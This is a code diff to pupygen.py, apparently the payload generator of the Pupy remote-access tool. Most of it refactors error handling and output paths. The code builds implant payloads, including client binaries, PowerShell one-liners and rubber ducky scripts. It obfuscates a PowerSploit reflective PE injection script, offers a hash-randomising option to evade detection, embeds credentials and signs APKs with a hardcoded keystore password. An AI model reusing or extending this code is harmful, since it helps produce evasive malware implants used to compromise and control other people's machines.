@@ -94,8 +94,8 @@ def get_raw_conf(conf, obfuscate=False):
                 for name in t.credentials:
                     required_credentials.add(name)
 
-    print colorize("[+] ", "green") + 'Required credentials:\n{}'.format(
-        '\n'.join([ colorize("[+] ", "green") + x for x in required_credentials])
+    print colorize("[+] ", "red") + 'Required credentials:\n{}'.format(
+        colorize("[+] ", "red") + ', '.join(required_credentials)
     )
 
     embedded_credentials = '\n'.join([
@@ -194,8 +194,7 @@ def get_edit_apk(path, conf):
             res=subprocess.check_output("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword '%s' pupy_key"%tempapk, shell=True)
         except OSError as e:
             if e.errno ==os.errno.ENOENT:
-                print "Please install jarsigner first."
-                sys.exit(1)
+                raise ValueError("Please install jarsigner first.")
             raise e
         # -tsa http://timestamp.digicert.com
         print(res)
@@ -266,7 +265,7 @@ def generate_binary_from_template(config, osname, arch=None, shared=False, debug
         raise ValueError('Template not found ({})'.format(template))
 
     for k, v in config.iteritems():
-        print "[C] {}: {}".format(k, v)
+        print colorize("[C] {}: {}".format(k, v), "yellow")
 
     return generator(template, config), filename, makex
 
@@ -296,8 +295,7 @@ def parse_scriptlets(args_scriptlet, debug=False):
                 for x,y in [x.strip().split("=") for x in tab[1].split(",")]:
                     sc_args[x.strip()]=y.strip()
             except:
-                print("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)
-                exit(1)
+                raise ValueError("usage: pupygen ... -s %s,arg1=value,arg2=value,..."%name)
 
         if name not in scriptlets_dic:
             print(colorize("[-] ","red")+"unknown scriptlet %s, valid choices are : %s"%(repr(name), [x for x in scriptlets_dic.iterkeys()]))
@@ -310,8 +308,8 @@ def parse_scriptlets(args_scriptlet, debug=False):
             print("")
             print("usage: pupygen.py ... -s %s,arg1=value,arg2=value,... ..."%name)
             scriptlets_dic[name].print_help()
+            raise ValueError('{}'.format(e))
 
-            exit(1)
     script_code=sp.pack()
     return script_code
 
@@ -338,7 +336,8 @@ class ListOptions(argparse.Action):
         for name, sc in scriptlets_dic.iteritems():
             print "\t- {:<15} : ".format(name)
             print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])
-        exit()
+
+        raise ValueError('Invalid options')
 
 PAYLOAD_FORMATS = [
     'client', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky'
@@ -359,6 +358,7 @@ def get_parser(base_parser, default_arch='x86', default_os='windows', default_fo
     parser.add_argument('-s', '--scriptlet', default=[], action='append', help="offline python scriptlets to execute before starting the connection. Multiple scriptlets can be privided.")
     parser.add_argument('-l', '--list', action=ListOptions, nargs=0, help="list available formats, transports, scriptlets and options")
     parser.add_argument('-i', '--interface', default=None, help="The default interface to listen on")
+    parser.add_argument('-E', '--prefer-external', action='store_true', help="In case of autodetection prefer external IP")
     parser.add_argument('--no-use-proxy', action='store_true', help="Don't use the target's proxy configuration even if it is used by target (for ps1_oneliner only for now)")
     parser.add_argument('--ps1-oneliner-listen-port', default=8080, type=int, help="Port used by ps1_oneliner listener (default: %(default)s)")
     parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
@@ -369,6 +369,8 @@ def get_parser(base_parser, default_arch='x86', default_os='windows', default_fo
     return parser
 
 def pupygen(args):
+    ok = colorize("[+] ","green")
+
     if args.workdir:
         os.chdir(args.workdir)
 
@@ -383,15 +385,18 @@ def pupygen(args):
             l.parse_args(args.launcher_args)
         except LauncherError as e:
             if str(e).strip().endswith("--host is required") and not "--host" in args.launcher_args:
-                myip=get_local_ip(args.interface)
+                myip=get_local_ip(args.interface, external=args.prefer_external)
                 if not myip:
-                    sys.exit("[-] --host parameter missing and couldn't find your local IP. You must precise an ip or a fqdn manually")
-                print(colorize("[!] required argument missing, automatically adding parameter --host %s:443 from local ip address"%myip,"grey"))
+                    raise ValueError("--host parameter missing and couldn't find your local IP. "
+                                         "You must precise an ip or a fqdn manually")
+
+                print(colorize("[!] required argument missing, automatically adding parameter "
+                                   "--host %s:443 from local or external ip address"%myip,"grey"))
                 args.launcher_args.insert(0,"%s:%d"%(myip, args.default_port))
                 args.launcher_args.insert(0,"--host")
             else:
                 l.arg_parser.print_usage()
-                exit(str(e))
+                return
         else:
             break
     if args.randomize_hash:
@@ -402,24 +407,31 @@ def pupygen(args):
     conf['offline_script']=script_code
     outpath=args.output
     if args.format=="client":
+        print ok+"Generate client: {}/{}".format(args.os, args.arch)
+
         data, filename, makex = generate_binary_from_template(
             conf, args.os,
             arch=args.arch, shared=args.shared, debug=args.debug
         )
 
         if not outpath:
-            outpath = os.path.join(args.output_dir, filename)
+            template, ext = filename.rsplit('.', 1)
+            outfile = tempfile.NamedTemporaryFile(
+                dir=args.output_dir,
+                prefix=template+'.',
+                suffix='.'+ext,
+                delete=False
+            )
+        else:
+            outfile = open(outpath, 'w+b')
 
-        try:
-            os.unlink(outpath)
-        except:
-            pass
-
-        with open(outpath, 'w') as out:
-            out.write(data)
+        outfile.write(data)
+        outfile.close()
 
         if makex:
-            os.chmod(outpath, 0511)
+            os.chmod(outfile.name, 0511)
+
+        outpath = outfile.name
 
     elif args.format=="py" or args.format=="pyinst":
         linux_modules = ""
@@ -459,11 +471,11 @@ def pupygen(args):
         for i,aPart in enumerate(binaryX86parts):
             x86InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
             x86ConcatCode += "$PEBytes{0}+".format(i)
-        print(colorize("[+] ","green")+"X86 dll loaded and {0} variables used".format(i+1))
+        print(ok+"X86 dll loaded and {0} variables used".format(i+1))
         for i,aPart in enumerate(binaryX64parts):
             x64InitCode += "$PEBytes{0}=\"{1}\"\n".format(i,aPart)
             x64ConcatCode += "$PEBytes{0}+".format(i)
-        print(colorize("[+] ","green")+"X64 dll loaded and {0} variables used".format(i+1))
+        print(ok+"X64 dll loaded and {0} variables used".format(i+1))
         script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
         with open(outpath, 'wb') as w:
             w.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]) ))
@@ -477,13 +489,11 @@ def pupygen(args):
     elif args.format=="rubber_ducky":
         rubber_ducky(conf).generateAllForOStarget()
     else:
-        exit("Type %s is invalid."%(args.format))
-    print(colorize("[+] ","green")+"payload successfully generated with config :")
-    print("OUTPUT_PATH = %s"%os.path.abspath(outpath))
-    print("LAUNCHER = %s"%repr(args.launcher))
-    print("LAUNCHER_ARGS = %s"%repr(args.launcher_args))
-    print("SCRIPTLETS = %s"%args.scriptlet)
-    print("DEBUG = %s"%args.debug)
+        raise ValueError("Type %s is invalid."%(args.format))
+
+    print(ok+"OUTPUT_PATH = %s"%os.path.abspath(outpath))
+    print(ok+"SCRIPTLETS = %s"%args.scriptlet)
+    print(ok+"DEBUG = %s"%args.debug)
     return os.path.abspath(outpath)
 
 if __name__ == '__main__':
@@ -496,4 +506,7 @@ if __name__ == '__main__':
         help="Choose a launcher. Launchers make payloads behave differently at startup."
     )
     parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher options")
-    pupygen(args)
+    try:
+        pupygen(parser.parse_args())
+    except Exception, e:
+        sys.exit(str(e))
